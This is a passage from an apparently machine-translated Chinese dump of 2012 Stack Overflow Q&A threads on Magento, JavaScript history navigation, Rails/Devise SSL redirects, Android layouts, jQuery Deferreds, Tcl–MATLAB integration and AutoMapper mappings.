$tmp = str_replace("\n", '', $tmp );

// restore CRLFs
$text = str_replace('S0m3L1k3LyUn1Qu3T3X7', "\r\n", $tmp); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T09:49:17.913

在 Notepad++ 中，您使用搜索/替换、勾选扩展（左下角）和替换

```
\n 
```

凭什么。

# magento-1.4 - Magento：在 CMS 页面中显示商店名称

> ID：13490398
> 
> 赞同：1
> 
> 时间：2012-11-21T09:46:35.637
> 
> 标签：magento-1.4, magento

我有一个拥有多家商店的 magento 网站。我想设置包含商店名称的 CMS 页面。我可以为每个商店创建一个页面，但我更喜欢使用其中动态包含商店名称的页面。您可以对事务性电子邮件执行相同操作并使用`{{var order.getStoreGroupName()}}`. 使用它没有任何意义，因为它与订单有关，但我希望类似的东西适用于商店对象本身。

这个问题似乎是相关的，我已经尝试了这些解决方案，但它不起作用：

[Magento CMS 页面/静态块 - 如何显示商店名称？](https://stackoverflow.com/questions/7544740/magento-cms-page-static-blocks-how-to-display-store-name)

解决方案之一链接到以下页面：

[http://forrst.com/posts/Get_Store_Information_in_Magento_templates_or_CM-VOh](http://forrst.com/posts/Get_Store_Information_in_Magento_templates_or_CM-VOh)

根据上面的解释，你应该可以使用以下变量：

`{{config path="general/store_information/name"}}`

在 admin->system->configuration, general->store information 中，您会看到商店名称。当我在 CMS 页面中使用它时，它会显示此代码，而不是商店名称。在管理员中它说“商店名称”，所以我尝试了它而不是“名称”，但这没有帮助。

我现在不想编辑 PHP 代码。是否有可能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:04:49.617

在 magento (v1.7) 中，您可以使用这两种方法之一（假设您已在 Admin -> Config -> General -> Store Info 中输入商店信息）。WYSIWYG 编辑器正在将您的代码转换为 html 实体

![在此处输入图像描述](../Images/f29377261a280d3d356d6876e50cede7.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-04-23T21:45:02.803

在**厘米**：

**获取当前商店的名称**

```
{{config path="general/store_information/name"}} 
```

> 注意：不要忘记配置您的商店名称： `admin->system->configuration, general->store information`选择左上角的商店并设置您要显示的商店名称。

# google-app-engine - 如何在带有进度条的谷歌应用程序中上传文件

> ID：13490404
> 
> 赞同：0
> 
> 时间：2012-11-21T09:47:05.150
> 
> 标签：google-app-engine

如何使用 blob 在 Google 应用中上传文件，当我**同时上传文件时**，我想显示进度条？我正在使用小服务程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:28:01.023

blobstore 中没有用于检查上传状态的服务器端挂钩。您可以使用客户端技术取得进展。看看提供您正在寻找的功能的[Plupload 。](http://www.plupload.com/index.php)

此外，有关如何将它与 App Engine 一起使用的示例，请查看 @NickJohnson 博客文章，其中介绍了使用 Blobstore API[第 2](http://blog.notdot.net/2010/04/Implementing-a-dropbox-service-with-the-Blobstore-API-part-2)部分和[第 3部分](http://blog.notdot.net/2010/04/Implementing-a-dropbox-service-with-the-Blobstore-API-part-3-Multiple-upload-support)*实现 Dropbox 服务* 。

# javascript - 如何使用javascript模拟浏览器后退按钮

> ID：13490407
> 
> 赞同：19
> 
> 时间：2012-11-21T09:47:09.690
> 
> 标签：javascript, html, hyperlink

> **可能重复：**
> [页面历史记录 - 后退按钮是否存在？](https://stackoverflow.com/questions/982254/page-history-back-button-exists)

我需要在网站的某些页面中有一个链接，通过点击它，它需要回到上一页，就像浏览器的后退按钮一样。这样做的正确方法是什么？我在想我应该使用一些客户端脚本，比如 Javascript，对吧？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-11-21T09:49:14.090

在 JavaScript 中，它是：

```
history.go(-1); 
```

或者

```
history.back(); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-21T09:49:31.960

只需使用

```
history.go(-1); 
```

但是在那之后你不能再前进了（所以前进按钮不会把你带回原来的位置——也就是说，这与单击后退按钮不是 100% 相同）。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-21T09:49:43.550

您可以使用：

```
<form>
    <input type="button" value="Zurück" name="back" onClick="javascript:history.back(1)">
</form> 
```

或在链接中：

```
<a href="javascript:history.back(1)">back</a> 
```

如果您想在之后继续前进，请使用`history.forward(1)`，但请注意：这仅在您之前调用`back()`时才有效！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-21T09:49:10.337

就像是：

```
<script>
function goBack()
{
  window.history.back()
}
</script> 
```

应该这样做。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-21T09:50:49.197

单击按钮使浏览器返回

```
<INPUT TYPE="BUTTON" VALUE="Go Back" ONCLICK="history.back()"> 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-21T09:50:17.997

我认为您可以将 History API 用于浏览器。

```
window.history.back() 
```

这应该有效。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-21T09:53:58.997

```
<FORM><INPUT TYPE="BUTTON" VALUE="Go Back" 
ONCLICK="history.go(-1)"></FORM> 
```

试试这个代码

# ruby-on-rails - Heroku，Rails：WildCard SSL 导致 env['warden'] 返回 nil

> ID：13490408
> 
> 赞同：3
> 
> 时间：2012-11-21T09:47:12.357
> 
> 标签：ruby-on-rails, ssl, heroku, devise, warden

在我的 Rails 应用程序中。我正在使用设计。用户会从“ja.myapp.com”、“www.myapp.com”等几个子域进入首页。我只在促销页面内使用几个子域，所以当他们进入“登录”页面时，所有他们将重定向到“www”子域页面。

当用户登录时，如果用户的profile_type是“学生”，用户将重定向到“学生之家”。如果是“教师”，“教师之家”。

当我使用“POW”进行测试时一切正常，但是当我将它上传到生产服务器时。用户登录后，他们都将重定向到 TOP 页面。

我回滚应用程序并尝试再次登录，但同样的事情发生了这发生在我将 heroku 证书从“单域 SSL”上传到“通配符子域 SSL”之后。

在我将 SSL 更改为单域之一后，回滚站点内不会再发生这种情况。

我想这是因为“通配符子域 SSL”和设计会话控制器而发生的，但对此不太确定。

有谁知道解决这个问题？

下面是代码。

# 路线.rb

```
root :to => 'students#index', :constraints => lambda { |request| request.env['warden'].user.try(:profile_type) == 'Student' }
root :to => 'teachers#index', :constraints => lambda { |request| request.env['warden'].user.try(:profile_type) == 'Teacher' }
root :to => 'pages#home'
devise_for :users, :controllers => {:sessions => "sessions", :registrations => "registrations", :confirmations => "confirmations"} 
```

# 配置/初始化程序/session_store.rb

```
MyAPP::Application.config.session_store :cookie_store, key: '_my_app_secure_session', domain: :all

# coding: utf-8
class SessionsController < Devise::SessionsController
  after_filter :clear_sign_signout_flash
  def after_sign_in_path_for(resource)
    url = root_path
  end

  def new
    @title = I18n.t "sessions.new.title"
    super
  end

  def create
    super
  end

  def destroy
    super
  end

  protected
  def clear_sign_signout_flash
    if flash.keys.include?(:notice)
      flash.delete(:notice)
    end
  end

end 
```

# 应用程序控制器

```
class ApplicationController < ActionController::Base
  protect_from_forgery
  before_filter :set_locale, :www_redirect

  private
  def www_redirect
    #if Rails.env.production
      parsed_subdomain = request.subdomains.first
      locale = Locale.find_by_subdomain(parsed_subdomain)
      if (use_www? && parsed_subdomain != "www") || locale.nil?
        redirect_to request.url.sub(parsed_subdomain, "www")
      end
    #end
  end

  def use_www?
    true
  end

  def set_locale
    if user_signed_in? 
      if current_user.profile_type == "Teacher"
        I18n.locale = I18n.default_locale
      else
        I18n.locale = current_user.locale.i18n_form.to_sym
      end
    else
      if request.subdomains.first == "www" && cookies[:locale]
        I18n.locale = cookies[:locale].to_sym
      else
        I18n.locale = extract_locale_from_subdomain || I18n.default_locale
        cookies[:locale] = {
          value: I18n.locale.to_s,
          expires: 1.year.from_now,
          domain: :all
        }
      end
    end
  end

  def extract_locale_from_subdomain
    parsed_subdomain = request.subdomains.first
    locale = Locale.find_by_subdomain(parsed_subdomain)
    if locale
      I18n.available_locales.include?(locale.i18n_form.to_sym) ? locale.i18n_form.to_sym : nil
    else
      nil
    end
  end
end 
```

# locale_settings_controller.rb

```
class LocaleSettingsController < ApplicationController

  def switch_language
    locale = params[:locale]
    locale = "www" if locale == "en"
    path = params[:uri]
    cookies[:locale] = {
      value: locale,
      expires: 1.year.from_now,
      domain: :all
    }
    if Rails.env.production?
      base_url = "http://" + "#{locale}" + ".myapp.com"
    else
      base_url = "http://" + "#{locale}" + ".myapp.dev"
    end
    url = path == "/" ?  base_url : base_url + "#{path}"
    redirect_to url
  end
end 
```

# 生产.rb

```
config.force_ssl = true 
```

# 配置/初始化程序/rack_rewrite.rb

```
require 'rack/rewrite'

LingualBox::Application.config.middleware.insert_before(Rack::Lock, Rack::Rewrite) do
  r301 %r{.*}, 'http://www.myapp.com$&', :if => Proc.new {|rack_env|
    rack_env['SERVER_NAME'] == 'myapp.com'
  }
end if Rails.env == 'production' 
```

# mysql - 是否需要在 MySQL 中添加 DEFAULT NULL？

> ID：13490413
> 
> 赞同：2
> 
> 时间：2012-11-21T09:47:28.813
> 
> 标签：mysql, database

如果我创建一个新表并且我有一个字段，我想默认为 NULL，是否有必要添加 DEFAULT NULL 或者默认情况下它已经为 NULL？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T09:49:07.150

默认情况下它为空——无需显式声明它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:49:35.410

实际上它是可选的，因为默认情况下它是`NULL`，例如

```
CREATE TABLE hello
(
   ID INT NOT NULL,
   NAME VARCHAR(50),
   OTHERs VARCHAR(50) DEFAULT 'FISH')
) 
```

`DEFAULT`仅在您想要除 之外的其他值时使用`NULL`。在上面的示例中，当您尝试仅插入时，和`ID`的值分别是和。`NAME``OTHERs``NULL``FISH`

# android - 关于在 Android 中创建登录表单

> ID：13490415
> 
> 赞同：1
> 
> 时间：2012-11-21T09:47:47.253
> 
> 标签：android, android-layout, android-intent, android-widget

我创建了一个简单的登录表单，通过提供用户名和密码，它会遍历下一页并显示用户名和密码。但我的问题是用户名和密码都没有显示在下一页中。一次只显示一个..因为我是android新手，任何人都可以帮我解决这个问题..

MainActivity.java

```
public class MainActivity extends Activity {
    public final static String UN = "com.example.loginpage.USERNAME";
    public static final String PWD = "com.example.loginpage.PASSWORD";

    public void sendMessage(View view) {
        Intent intent = new Intent(this, DisplayMessageActivity.class);
        EditText EditText01 = (EditText) findViewById(R.id.EditText01);
        EditText EditText02 = (EditText) findViewById(R.id.EditText02);
        String Un = EditText01.getText().toString();
        String Pwd = EditText02.getText().toString();
        intent.putExtra(UN, Un);
        intent.putExtra(PWD, Pwd);
        startActivity(intent);
    } 
```

我的下一个活动代码是（DisplayMessageActivity）

```
public void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
     setContentView(R.layout.activity_display_message);
     getActionBar().setDisplayHomeAsUpEnabled(true);
     Intent intent = getIntent();
     String message1 = intent.getStringExtra(MainActivity.UN);
     String message2 = intent.getStringExtra(MainActivity.PWD);
     TextView textView1 = new TextView(this);
     textView1.setTextSize(40);
     textView1.setText(message1);
     TextView textView2 = new TextView(this);
     textView2.setTextSize(40);
     textView2.setText(message2);
     setContentView(textView1);
     setContentView(textView2);
 } 
```

我想在下一页显示用户名和密码提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:54:49.187

问题在于`setContentView()`替换您之前设置的先前布局。尝试`addContentView()`改用。或者更好的方法是在布局文件 show_login_and_password.xml 中定义这些文本视图：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="match_parent"
  android:layout_height="match_parent">

  <TextView
    android:id="@+id/textview1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

  <TextView
    android:id="@+id/textview2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

</LinearLayout> 
```

然后在你的活动中创建

```
setContentView(R.layout.show_login_and_password);

TextView t1 = (TextView) findViewById(R.id.textview1);
t1.setText(intent.getStringExtra(MainActivity.UN));

TextView t2 = (TextView) findViewById(R.id.textview2);
t2.setText(intent.getStringExtra(MainActivity.PWD)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:56:20.963

你可以试试这个：

```
Bundle extras = getIntent().getExtras();
return extras != null ? extras.getString(MainActivity.UN) : "nothing passed in"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:55:02.610

```
TextView textView1=new TextView(this);
textView1.setTextSize(40);
textView1.setText(message1);
TextView textView2=new TextView(this);
textView2.setTextSize(40);
textView2.setText(message2);
setContentView(textView1);
setContentView(textView2); 
```

您设置文本视图的方式不会显示出来。在你的activity_display_message 布局xml 中添加这些文本视图怎么样？

首先创建您的 activity_display_message.xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="match_parent"
  android:layout_height="match_parent">

  <TextView
    android:id="@+id/textview1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

  <TextView
    android:id="@+id/textview2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

</LinearLayout> 
```

像这样更改您的 onCreate() 方法：

```
public void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
     setContentView(R.layout.activity_display_message);
     getActionBar().setDisplayHomeAsUpEnabled(true);
     Intent intent = getIntent();
     String message1 = intent.getStringExtra(MainActivity.UN);
     String message2 = intent.getStringExtra(MainActivity.PWD);
     TextView textView1 = (TextView) findViewById(R.id.textview1);
     textView1.setTextSize(40);
     textView1.setText(message1);
     TextView textView2 = (TextView) findViewById(R.id.textview2);
     textView2.setTextSize(40);
     textView2.setText(message2);
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T09:55:02.820

这是你的问题：

```
setContentView(textView1);
setContentView(textView2); 
```

第二个调用覆盖第一个。

在 XML 中定义布局并将您的值放入已定义的文本框/标签中

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T10:05:30.120

我的天哪，你怎么能写两次 setContentView。

这是更正的片段。

```
// Creating a new LinearLayout
LinearLayout parentLayout = new LinearLayout(this);

// Setting the orientation to vertical
parentLayout.setOrientation(LinearLayout.VERTICAL);

LinearLayout.LayoutParams llp = new LinearLayout.LayoutParams(
LinearLayout.LayoutParams.FILL_PARENT,
LinearLayout.LayoutParams.FILL_PARENT);

final TextView txtName = new TextView(this);
final TextView txtPwd = new TextView(this);

txtName.setText(message1);
txtPwd.setText(message2);

// Defining the layout parameters of the TextView
LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
LinearLayout.LayoutParams.FILL_PARENT,
LinearLayout.LayoutParams.WRAP_CONTENT);

txtName.setLayoutParams(lp);
txtPwd.setLayoutParams(lp);

parentLayout.addView(txtName);
parentLayout.addView(txtPwd);

setContentView(parentLayout, llp); 
```

# php - PHP：通过一个无序索引多维数组

> ID：13490418
> 
> 赞同：0
> 
> 时间：2012-11-21T09:47:56.963
> 
> 标签：php, arrays, object, multidimensional-array, foreach

我有以下数组：

```
$users
: array = 
  0: array = 
    0: object(Person) = 
      strName: string = John
      strLastName: string = Smith
      strAge: string = 19
    1: object(Person) = 
      strName: string = Jean
      strLastName: string = Newton
      strAge: string = 22
  1: array = 
    0: object(Person)= 
      strName: string = John
      strLastName: string = Smith
      strAge: string = 19
    1: object(Person) = 
      strName: string = Jean
      strLastName: string = Newton
      strAge: string = 22
  2: array = 
    0: object(Person) = 
      strName: string = Martin
      strLastName: string = Marin
      strAge: string = 25 
```

为了摆脱我所做的重复：

```
$users = array_map("unserialize", array_unique(array_map("serialize", $users))); 
```

我得到：

```
$users
: array = 
  0: array = 
    0: object(Person) = 
      strName: string = John
      strLastName: string = Smith
      strAge: string = 19  
    1: object(Person) = 
      strName: string = Jean
      strLastName: string = Newton
      strAge: string = 22  
  1: array = 
    0: object(Person) = 
      strName: string = Martin
      strLastName: string = Marin                                                                                                        
      strAge: string = 25 
```

现在我必须获取数组包含的信息。我正在做：

```
$i=0;
foreach ($users as $u)
{
  echo $u [$i]->getName()); 
.
.
  $i++;
 } 
```

但我没有打印数组的所有元素，$u [2] 是 NULL。

我做错了什么？

万分感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:53:28.590

你有嵌套数组：你需要嵌套循环。

```
foreach ($users as $ulist) {
    foreach ($ulist as $u) {
        echo $u->getName(); 
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:54:53.523

尝试

```
$i=0;
foreach ($users as $u)
{
  while ($u [$i] != NULL ){
echo $u [$i]->getName(); 
.
.
  $i++;
}
$i=0
 } 
```

你试图循环，但没有重置 $i

更精确 ：

数组调用

```
0 0
0 1
1 2   << does not exist   => $u [2] = Null
1 3 
```

# jquery - 掌握如何在我的 AJAX 调用中使用 jQuery Deferreds

> ID：13490419
> 
> 赞同：1
> 
> 时间：2012-11-21T09:47:57.753
> 
> 标签：jquery, ajax

我的网页中有 2 个部分需要单独的 AJAX 调用，然后是数据模板，然后再将内容注入 DOM。现在我正在寻找最好的方法，并且我已经阅读了很多关于 jQuery Deferreds 的文章，以至于我不完全确定最好的方法是什么。下面是我认为我会使用的代码，但我非常感谢一些输入。如果有人想对此添加一些建议，我也对缓存非常模糊。

JS

```
function ajaxCall1() {
    var dfd = $.Deferred();
    return $.ajax({
        type: 'POST',
        dataType: 'json',
        url: '/url1',
        data: { },
        success: function(data) {
            // Run templating code
        }
    });
    return dfd.promise();
}

function ajaxCall2() {
    var dfd = $.Deferred();
    return $.ajax({
        type: 'POST',
        dataType: 'json',
        url: '/url2',
        data: { },
        success: function(response) {
            // Run templating code
        }
    });
    return dfd.promise();
}

$.when( ajaxCall1(), ajaxCall2() )
   .then(function(){
      // Display DOM elements
   })
   .fail(function(){
      // Display error message
   }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:54:20.633

为了使用 Deferreds，你应该

```
1 - generate a new $.Deferred()
2 - return its .promise() from the function
3 - .resolve() the deferred in the callback of the Ajax request 
```

有点像

```
function ajaxCall1() {
   var dfd = new $.Deferred();
   $.ajax({
      ...
      success: function(data) {
         dfd.resolve(data);
      }
   });
   return dfd.promise();
}

function ajaxCall2() {
   var dfd = new $.Deferred();
   $.ajax({
      ...
      success: function(data) {
         dfd.resolve(data);
      }
   });
   return dfd.promise();
}

$.when(ajaxCall1(), ajaxCall2()).then(function(data1, data2) {
   // data1 holds the result of the first ajax call, data2 that of the second call
}); 
```

编辑：由于 $.ajax() 已经返回一个延迟，你可以简单地做到这一点

```
function ajaxCall1() {
   return $.ajax({
      ...
   });
}

function ajaxCall2() {
   return $.ajax({
      ...
   });
}

$.when(ajaxCall1(), ajaxCall2()).done(function(data1, data2) {
   // data1 holds the result of the first ajax call, data2 that of the second call
}); 
```

# c# - 如何转换数组中的游戏对象？

> ID：13490424
> 
> 赞同：0
> 
> 时间：2012-11-21T09:48:09.430
> 
> 标签：c#, arrays, transform, unity3d

我在场景中有一系列可用的游戏对象。GO 数组应根据通过 UDP 连接接收到的浮点数进行转换。我知道这很简单，但无法弄清楚如何根据收到的每个 GO 的唯一浮点数来完成对 GO 数组的转换，任何帮助将不胜感激。

这是一个转换浮动，我猜它可能会有所帮助：

```
x =ReadSingleBigEndian(data, signalOffset);
        signalOffset+=4;
        y= ReadSingleBigEndian(data, signalOffset);
        signalOffset+=4;
        z= ReadSingleBigEndian(data, signalOffset);
        signalOffset+=4;
        alpha= ReadSingleBigEndian(data, signalOffset);
        signalOffset+=4;
        theta= ReadSingleBigEndian(data,signalOffset);
        signalOffset+=4;
        phi= ReadSingleBigEndian(data,signalOffset);
        signalOffset+=4; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:51:57.073

你的意思是翻译游戏对象的变换吗？您可以轻松地遍历您的 GameObjects 数组来实现这一点

```
public void translateEachGameObject(float x, float y, float z, GameObjects[] objects) {
   foreach(var obj in objects) {
      obj.transform.translate(x,y,z);
   }
} 
```

[Transform](http://docs.unity3d.com/Documentation/ScriptReference/Transform.html)是 GameObject 中的一个对象，本身不是一个方法。

# java - 无法启动摆动计时器

> ID：13490426
> 
> 赞同：-1
> 
> 时间：2012-11-21T09:48:16.620
> 
> 标签：java, swing, timer

我正在尝试制作一个在我按下按钮但从不启动时执行的 Swing Timer。我的代码是：

```
public class prueba extends JFrame {
    java.util.Date date= new java.util.Date();
    private JPanel contentPane;
    Timer timero;
        ........

public prueba() {
         ..........
        timero  = new Timer(1000, new ActionListener() {
            public void actionPerformed(ActionEvent e) {
              System.out.println("otra vez....uauuauauaua");
            }
          });
        btnIniciar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                  timero.start();
                                  ............... 
```

请问你能帮帮我吗？谢谢和对不起我的英语！

当我这样做时，我有一个错误：

```
public class prueba extends JFrame {
    java.util.Date date= new java.util.Date();
    private JPanel contentPane;
    Timer timero;

public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {
        public void run() {
            try {
                prueba frame = new prueba();
                frame.setVisible(true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    });
}

public prueba() {

    final WebManager web = new WebManager("user","pass","http://www.spanishtracker.com/login.php");
    //web.EnableDebug();
    web.doLogin();
    web.getCookies;
        .....
    contentPane.add(txtSalida, gbc_txtSalida);

    timero.start(); 
```

它给了我一个错误：

```
java.lang.NullPointerException
    at prueba.<init>(prueba.java:216)
    at prueba$1.run(prueba.java:56)
    at java.awt.event.InvocationEvent.dispatch(Unknown Source)
    at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
    at java.awt.EventQueue.access$400(Unknown Source)
    at java.awt.EventQueue$2.run(Unknown Source)

These lines are:
216         timero.start();
56      prueba frame = new prueba(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T18:12:23.927

您可能有另一个`Timer`名称`timero`，[*它*](https://stackoverflow.com/q/2271186/230513)会影响您调用的名称`.start()`。作为参考，这个[例子](https://stackoverflow.com/a/5048863/230513)展示了如何启动和停止一个定时器，这个[例子](https://stackoverflow.com/a/5529043/230513)展示了如何公开一个*转发*给封闭定时器的`start()`方法。后者有助于避免在构造函数结束之前过早启动计时器。

# android - include 防止显示其他布局

> ID：13490429
> 
> 赞同：0
> 
> 时间：2012-11-21T09:48:20.543
> 
> 标签：android

我有一个布局，它从包含到另一个布局开始，然后是一个带有两个按钮的 LinearLayout。

问题是我在添加包含后看不到带有两个按钮的布局。但是当我用另一个布局包装包含时，我确实看到了包含下方的两个按钮，问题就解决了。

有人可以告诉我为什么我必须包装包含吗？

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >

        <include
            android:id="@+id/keypad_layout"
            layout="@layout/keypad_layout" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >

        <Button
            android:id="@+id/buttonAudio"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/button_audio_selector" />

        <Button
            android:id="@+id/buttonVideo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/button_video_selector" />
    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:53:15.627

尝试这个

```
<include
            android:layout_height="wrap_content"
            android:id="@+id/keypad_layout"
            layout="@layout/keypad_layout" /> 
```

也许`layout_height`in `keypad_layout`root`match_parent`在包含中是如此覆盖它

# richtextbox - 传统浏览器中的文本编辑

> ID：13490436
> 
> 赞同：0
> 
> 时间：2012-11-21T09:48:54.957
> 
> 标签：richtextbox

某些网页，例如 yahoo 邮件中的 NEW，允许在可滚动字段（字体、字体和样式、对齐方式等）中编辑文本，并使用适用于大多数传统浏览器的客户端脚本复制/粘贴选择。我希望看到该脚本的完整详细描述。

谢谢， 塞佩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:01:49.840

网上有很多`RickTextBox`免费的实现（客户端和服务器端），取决于你想要什么语言，你可以查看相应插件的代码及其详细描述，这里很少提及：

*   [20 个优秀的免费富文本编辑器](http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/)
*   [ASP.NET MVC 编辑器](http://demos.telerik.com/aspnet-mvc/editor)
*   [客户端（基于 jQuery 和 JavaScript）](http://www.queness.com/post/212/10-jquery-and-non-jquery-javascript-rich-text-editors)

# macos - 如何从 tcl 脚本 (mac) 运行 .m 文件

> ID：13490448
> 
> 赞同：1
> 
> 时间：2012-11-21T09:49:14.643
> 
> 标签：macos, matlab, tcl

有谁知道我如何能够在我的 mac 上从我的 tcl 脚本中运行 matlab .m 文件。我想做一些链接这个：

1.  在我的 .tcl 脚本中定义一些变量：

    ```
    # run_matlab.tcl:
    set a 1;
    set b 2;
    set c 3; 
    ```

2.  打开 matlab test.m 并使用预定义的变量（在 tcl 中预定义）执行一些计算，例如：

    ```
    % test.m
    D = [a b c];
    E = [c b a]';
    F = D*E 
    ```

3.  回到 tcl 根据 F 设置新变量（在 matlab 中计算）并使用 F 执行更多计算，例如：

    ```
    # run_matlab.tcl:
    set m $F;
    set n [expr 3*$m];
    puts $n 
    ```

我是一个绝对的新手，不知道如何处理这个问题。有谁能够帮我？？

## 第一个解决方案

我已经做了一些事情，但我对此并不是 100% 满意。我的解决方案如下所示：

```
 # test.tcl
    # parameter definition
    set a 7;
    set b 5;

    # calculation of 'e' in matlab
    exec /Applications/MATLAB_R2012a.app/bin/matlab -nosplash -nodesktop -r test_matlab($a,$b);

    # input calculated variables
    # c = a+b = 2
    # d = a-b = 12
    source output.tcl

    # do further calculations
    set e [expr $c+$d];
    puts $e 
```

Matlab .m 文件看起来像这样：

```
function test_matlab(a,b)
% calculate a and b
c = a+b;
d = a-b;
% output
fprintf(fopen(['output.tcl'],'a+'),'set c %f;\n',c);
fprintf(fopen(['output.tcl'],'a+'),'set d %f;\n',d);
% quit matlab
quit
end 
```

所以有人可以看到，我要用'source output.tcl'加载我的计算数据。

但是：有没有办法让我的变量直接进入 tcl 变量？那么列表呢？如果我在matlab中计算了一个向量，我怎样才能直接将这个向量保存到一个列表中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:56:54.360

我对TCL没有经验。但我相信你可以让它调用带有参数的命令。基本上你有两个选择：

1.  从命令行调用 Matlab（特别是[参见](http://www.mathworks.de/de/help/matlab/ref/matlabwindows.html)`matlab -r "statement"`参考资料）并将您的声明放入调用中。

2.  您可以将您的 Matlab 脚本设置为服务器，并让它在您发送命令和接收答案的某个端口上进行侦听。在 Windows 上，您还可以使用 COM 连接到 Matlab 并发送命令 - 但我找不到 Mac/Linux 上是否有类似的功能。

此外，您可能会考虑使用[mbuild](http://www.mathworks.com/help/toolbox/compiler/mbuild.html)编译您的脚本。这样不仅可以分发它-而且我认为如果您编译为java，则可能更容易集成到TCL中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T14:52:57.270

您可以让 matlab 简单地打印这两个值（在单独的行上或在一行上以空格分隔）。然后，在 Tcl 中：

```
set output [exec matlab ...]
lassign [split $output] c d
# do stuff with $c and $d 
```

# .net - Automapper：使用 ReverseMap() 和 ForMember() 进行双向映射

> ID：13490456
> 
> 赞同：73
> 
> 时间：2012-11-21T09:49:36.313
> 
> 标签：.net, automapper, bidirectional

我有一种情况，我想将实体映射到视图模型并返回。我必须明确指定映射，`ForMember()`因为它们的属性不共享完全相同的名称。这是我的课程的一个简短示例：

```
public class PartTwo {
    public int Integer { get; set; }
}

public class PartTwoViewModel {
    public int PartInteger { get; set; }
} 
```

我想以这种方式使用它们：

```
Mapper.CreateMap<PartTwo, PartTwoViewModel>()
    .ForMember(dst => dst.PartInteger, opt => opt.MapFrom(src => src.Integer))
    .ReverseMap();

var partTwoViewModel = new PartTwoViewModel() { PartInteger = 42 };
var partTwo = Mapper.Map<PartTwoViewModel, PartTwo>(partTwoViewModel);
Assert.AreEqual(partTwoViewModel.PartInteger, partTwo.Integer); 
```

但它与属性不`PartInteger`匹配`Integer`。（`Integer`是`0`。）

有没有办法使这项工作？（当两个类的属性名称相同时，它可以工作。）我是否必须在方法中设置某种选项`ForMember()`？

* * *

## 回答 #1

> 赞同：160
> 
> 时间：2013-08-28T13:57:57.693

`ReverseMap`返回一个`IMappingExpression`表示反转的映射。调用后，后续调用将用于配置地图的反转。

这是一个例子：

```
Mapper.CreateMap<CartItemDto, CartItemModel>()
      .ForMember(dest => dest.ExtendedCost, opt => opt.Ignore())
      .ReverseMap()
          .ForMember(dest => dest.Pricing, opt => opt.Ignore()) 
```

这将忽略`Pricing`相反方向的字段。

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2012-11-21T10:30:15.293

您可以像这样定义您的配置：

```
Mapper.CreateMap<PartTwo, PartTwoViewModel>()
    .ForMember(dst => dst.PartInteger, opt => opt.MapFrom(src => src.Integer));

Mapper.CreateMap<PartTwoViewModel, PartTwo>()
    .ForMember(dst => dst.Integer, opt => opt.MapFrom(src => src.PartInteger)); 
```

**更新**

这是最初实施[的提交。](https://github.com/AutoMapper/AutoMapper/commit/bff6e2aa49af3e7b50f527376da48924efa7d81e)`ReverseMap`从我在代码中可以看到，它只创建了一个简单的反向映射。例如，在这种情况下，它会自动配置等价于：

```
Mapper.CreateMap<PartTwoViewModel, PartTwo>(); 
```

要获得更复杂的东西，恐怕您将不得不手动配置它。

# php - 如何使用内联 html 中的变量路径获取背景图像？

> ID：13490458
> 
> 赞同：1
> 
> 时间：2012-11-21T09:49:38.427
> 
> 标签：php, wordpress, background-image

